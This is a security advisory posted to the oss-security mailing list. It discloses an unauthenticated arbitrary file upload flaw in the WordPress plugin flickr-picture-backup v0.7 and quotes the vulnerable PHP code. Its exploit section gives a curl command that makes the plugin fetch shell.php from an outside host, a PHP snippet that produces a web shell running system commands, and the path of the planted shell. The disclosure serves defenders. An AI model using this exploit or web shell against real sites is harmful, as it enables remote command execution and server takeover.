  oss-security - Arbitrary file upload vulnerability in Wordpress plugin  flickr-picture-backup v0.7            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Sun, 30 Apr From: "Larry W. Cashdollar" <larry0@...com> To: Open Source Security <oss-security@...ts.openwall.com> Subject: Arbitrary file upload vulnerability in Wordpress plugin  flickr-picture-backup v0.7  Title: Arbitrary file upload vulnerability in Wordpress plugin flickr-picture-backup v0.7 Author: Larry W. Cashdollar, @_larry0 Date: Download Site: https://wordpress.org/plugins/flickr-picture-backup/ Vendor: http://daozhao.goflytoday.com/ Vendor Notified: Vendor Contact: Advisory: Description: Backup flickr’s picture which in page/post External links to flickr’s picture.  Vulnerability: The code in flickr-picture-download.php doesn't check to see if the user is authenticated or that they have permission to upload files.  It also doesn't check what type of file is being uploaded.  define('WP_ADMIN', TRUE); require_once('../../../wp-load.php'); require_once(ABSPATH . 'wp-admin/includes/admin.php'); //require_once("./flickr-picture-backup.php"); //echo "flickr-picture-download.php"; if($_GET["url"]) {     $url = $_GET["url"];     $fl = wp_daozhao_download_flickr_picture($url);     if ( is_wp_error($fl) )     { 		echo  "FALSE:" . $fl->get_error_message();     }     else     {         wp_daozhao_flickr_backupfile_exists($url,$returl);         echo "OK:" . $returl ;     }     //echo wp_daozhao_flickr_backup_urlpath();     //echo "OK"; }  Export: JSON TEXT XML Exploit Code: 	• $ curl http://example.com/wp-content/plugins/flickr-picture-backup/flickr-picture-download.php -d "url=http://myhost/shell.php" 	•   	• Where shell.php is code to print out php web shell code, something like: 	•   	• <?php 	• echo "<?php\n\$cmd=\$_GET['cmd'];\nsystem(\$cmd);\n?>\n"; 	• ?> 	•   	• Upon exploitation your shell is in: 	•   	• http://example.com/wp-content/uploads/flickr_backup/shell.php Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      